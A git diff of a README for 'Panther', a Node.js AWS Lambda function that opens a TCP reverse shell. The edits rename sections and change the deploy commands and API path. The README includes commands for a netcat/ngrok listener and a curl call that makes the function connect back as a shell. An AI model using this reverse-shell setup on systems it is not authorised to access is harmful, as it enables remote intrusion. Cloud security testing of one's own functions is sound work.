@@ -6,15 +6,14 @@ Panther is a Node.js function that can be deployed to the AWS to establish a TCP
 
 * [AWS Command Line Interface](https://aws.amazon.com/cli/)
 * [Node.js / NPM](https://nodejs.org/en/download/)
-* [Serverless Framework](https://serverless.com/framework/docs/providers/aws/guide/installation#installing-the-serverless-framework)
 
-## Getting Started
+## Deploying The Function
 
 ```bash
 cd /PATH/TO/panther
 aws configure
 npm install
-serverless deploy
+npx serverless deploy
 ```
 
 Record the API key provided in the output:
@@ -31,7 +30,7 @@ api keys:
   panther: YOUR_API_KEY
 ```
 
-## Usage
+## Testing in AWS
 
 Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):
 
@@ -48,7 +47,7 @@ ngrok tcp 4444
 Navigate to your function, supplying your connection details and API key:
 
 ```bash
-curl 'https://YOUR_API_GATEWAY_ID.execute-api.us-east-1.amazonaws.com/dev/panther?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'X-API-Key: YOUR_API_KEY'
+curl 'https://YOUR_API_GATEWAY_ID.execute-api.us-east-1.amazonaws.com/dev/api/Panther?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'X-API-Key: YOUR_API_KEY'
 ```
 
 Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file, though it cannot be extended past 30 seconds as it is attached to an API Gateway.
@@ -56,7 +55,7 @@ Your listener will now act as a reverse shell for the duration of the function i
 ## Teardown
 
 ```bash
-serverless remove
+npx serverless remove
 ```
 
 ## Running Locally
@@ -68,7 +67,7 @@ npm start
 ## Testing Locally
 
 ```bash
-curl 'http://localhost:3000/panther?host=0.tcp.ngrok.io&port=17105?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'x-api-key: offlineKey'
+curl 'http://localhost:3000/api/Panther?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'x-api-key: offlineKey'
 ```
 
 ## Linting
